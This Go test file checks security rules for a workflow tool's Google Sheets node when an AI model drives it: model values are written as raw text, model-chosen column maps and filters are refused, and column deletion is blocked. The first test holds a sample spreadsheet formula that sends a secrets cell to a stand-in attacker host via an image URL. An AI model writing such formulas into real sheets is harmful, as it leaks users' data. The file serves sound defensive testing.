package nodes_test

import (
	"strings"
	"testing"

	"github.com/kilaslab/kilas-flow/internal/workflow"
)

// What a security review of the Sheets tool found. Each test failed before the
// rule it pins existed.

// A model's value that starts with "=" must stay text. Written with
// USER_ENTERED, Sheets would evaluate it as a formula (IMPORTRANGE, IMAGE with
// a URL carrying other cells), so every write a tool makes is RAW whatever the
// author's cell format says. The fake-Sheets tests are not parallel.
func TestAToolCallWritesRawSoAModelsFormulaStaysText(t *testing.T) {
	formula := `=IMAGE("https://evil.example/?d="&ENCODEURL(Secrets!A1))`
	valueInput := func(call fakeCall) string {
		if text := call.Query.Get("valueInputOption"); text != "" {
			return text
		}
		text, _ := call.Body["valueInputOption"].(string)
		return text
	}
	for name, test := range map[string]struct {
		operation string
		options   map[string]any
		match     string
	}{
		"append":                   {"append", nil, `^PUT .*values/`},
		"append with USER_ENTERED": {"append", map[string]any{"cellFormat": "USER_ENTERED"}, `^PUT .*values/`},
		"append through the API":   {"append", map[string]any{"useAppend": true}, `:append$`},
		"update":                   {"update", nil, `values:batchUpdate$`},
		"appendOrUpdate":           {"appendOrUpdate", map[string]any{"cellFormat": "USER_ENTERED"}, `values:batchUpdate$`},
	} {
		t.Run(name, func(t *testing.T) {
			setup := newSheetsSetup(t)
			setup.peopleTab()
			matching := "name"
			if test.operation == "append" {
				matching = ""
			}
			extra := map[string]any{"columns": manualColumns(matching, map[string]any{
				"name": sheetsExpr("{{ $fromAI('n', 'who') }}"), "status": sheetsExpr("{{ $fromAI('s', 'state') }}"),
			})}
			if test.options != nil {
				extra["options"] = test.options
			}
			if _, err := setup.runAsTool(sheetsParams(test.operation, extra), nil, map[string]any{"n": "Bo", "s": formula}); err != nil {
				t.Fatalf("Execute() error = %v", err)
			}
			writes := setup.fake.callsMatching(test.match)
			if len(writes) == 0 {
				t.Fatalf("no write matched %s:\n%s", test.match, setup.fake.callLog())
			}
			for _, call := range writes {
				if got := valueInput(call); got != "RAW" {
					t.Errorf("%s sent valueInputOption %q, want RAW", call, got)
				}
			}
		})
	}

	// As an ordinary step the node keeps what the author chose.
	setup := newSheetsSetup(t)
	setup.peopleTab()
	setup.run(t, sheetsParams("update", map[string]any{"columns": manualColumns("name", map[string]any{
		"name": "Bo", "status": "=1+1",
	})}), nil)
	steps := setup.fake.callsMatching(`values:batchUpdate$`)
	if len(steps) == 0 {
		t.Fatalf("the ordinary step wrote nothing:\n%s", setup.fake.callLog())
	}
	for _, call := range steps {
		if got, _ := call.Body["valueInputOption"].(string); got != "USER_ENTERED" {
			t.Errorf("the ordinary step sent valueInputOption %q, want USER_ENTERED", got)
		}
	}
}

// Only the VALUES of the mapping may hold the model's words. A whole-map
// expression would let the model choose which columns are written, and a
// filter list or entry that is an expression would let it choose the column to
// look in.
func TestTheGoogleSheetsToolRefusesAModelChosenColumnMapOrFilterList(t *testing.T) {
	t.Parallel()

	tool := sheetsToolNode(t)
	update := func(columns map[string]any) map[string]any {
		return sheetsToolParams("update", map[string]any{"columns": columns})
	}
	columnsWith := func(key string, value any) map[string]any {
		columns := manualColumns("name", map[string]any{"name": modelValue("name", "who")})
		columns[key] = value
		return columns
	}
	read := func(filters any) map[string]any {
		return sheetsToolParams("read", map[string]any{"filtersUI": filters})
	}
	entry := func(fields map[string]any) any { return map[string]any{"values": []any{fields}} }

	for name, test := range map[string]struct {
		parameters map[string]any
		names      string
	}{
		"columns.value as a fromAI map":     {update(columnsWith("value", modelValue("row", "the row"))), "value"},
		"columns.value as the whole item":   {update(columnsWith("value", formExpression("{{ $json }}"))), "value"},
		"columns.value as template text":    {update(columnsWith("value", "{{ $json }}")), "value"},
		"columns.value as a list":           {update(columnsWith("value", []any{"x"})), "value"},
		"schema as an expression":           {update(columnsWith("schema", formExpression("{{ $json.schema }}"))), "schema"},
		"schema row with template text":     {update(columnsWith("schema", []any{map[string]any{"id": "{{ $json.c }}"}})), "schema"},
		"filtersUI as a fromAI object":      {read(modelValue("f", "filters")), "filtersUI"},
		"filtersUI as template text":        {read("{{ $json.f }}"), "filtersUI"},
		"filtersUI.values as an expression": {read(map[string]any{"values": modelValue("f", "filters")}), "filtersUI"},
		"filtersUI.values as template text": {read(map[string]any{"values": "{{ $json.f }}"}), "filtersUI"},
		"a filter entry as an expression":   {read(map[string]any{"values": []any{modelValue("f", "one filter")}}), "filtersUI"},
		"a filter entry's extra key":        {read(entry(map[string]any{"lookupColumn": "Order ID", "lookupValue": "x", "other": modelValue("o", "o")})), "filtersUI"},
	} {
		err := tool.Validate(workflow.Node{Parameters: test.parameters})
		if err == nil || !strings.Contains(err.Error(), test.names) {
			t.Errorf("Validate(%s) = %v, want a refusal naming %s", name, err, test.names)
		}
	}
	// The values stay the model's.
	for name, parameters := range map[string]map[string]any{
		"a filter value": read(entry(map[string]any{"lookupColumn": "Order ID", "lookupValue": modelValue("o", "the order")})),
		"column values":  update(columnsWith("value", map[string]any{"name": modelValue("n", "who"), "status": modelValue("s", "state")})),
		"no filters":     read(nil),
	} {
		if err := tool.Validate(workflow.Node{Parameters: parameters}); err != nil {
			t.Errorf("Validate(%s) = %v", name, err)
		}
	}
}

// The executor judges the unresolved parameters again before it calls Google:
// a descriptor is data, and the whole-map expression would otherwise resolve to
// whatever columns the model named.
func TestTheExecutorRefusesAModelChosenColumnMapWhenRunAsATool(t *testing.T) {
	setup := newSheetsSetup(t)
	setup.peopleTab()
	params := sheetsParams("update", map[string]any{"columns": map[string]any{
		"mappingMode": "defineBelow", "matchingColumns": []any{"name"},
		"value": sheetsExpr("{{ $fromAI('row', 'the row', 'json') }}"),
	}})
	_, err := setup.runAsTool(params, nil, map[string]any{"row": map[string]any{"name": "Ann", "age": "999"}})
	if err == nil || !strings.Contains(err.Error(), "value") {
		t.Fatalf("Execute() error = %v, want the model-chosen column map refused", err)
	}
	if log := setup.fake.callLog(); log != "" {
		t.Fatalf("Google was called before the refusal:\n%s", log)
	}
}

// A model-chosen start column can reach the header column. Deleting columns is
// the author's own job as a step; a tool deletes rows.
func TestTheGoogleSheetsToolDoesNotDeleteColumns(t *testing.T) {
	tool := sheetsToolNode(t)
	remove := sheetsToolParams("delete", map[string]any{
		"toDelete": "columns", "numberToDelete": float64(1), "startIndex": modelValue("col", "the column letter"),
	})
	if err := tool.Validate(workflow.Node{Parameters: remove}); err == nil || !strings.Contains(err.Error(), "columns") {
		t.Errorf("Validate(delete columns) = %v, want a refusal naming columns", err)
	}

	setup := newSheetsSetup(t)
	setup.peopleTab()
	_, err := setup.runAsTool(sheetsParams("delete", map[string]any{
		"toDelete": "columns", "numberToDelete": float64(1), "startIndex": sheetsExpr("{{ $fromAI('c', 'col') }}"),
	}), nil, map[string]any{"c": "A"})
	if err == nil || !strings.Contains(err.Error(), "columns") {
		t.Fatalf("Execute() error = %v, want deleting columns refused", err)
	}
	if log := setup.fake.callLog(); log != "" {
		t.Fatalf("Google was called before the refusal:\n%s", log)
	}
	// As a step it still works.
	setup.run(t, sheetsParams("delete", map[string]any{"toDelete": "columns", "numberToDelete": float64(1), "startIndex": "C"}), nil)
}
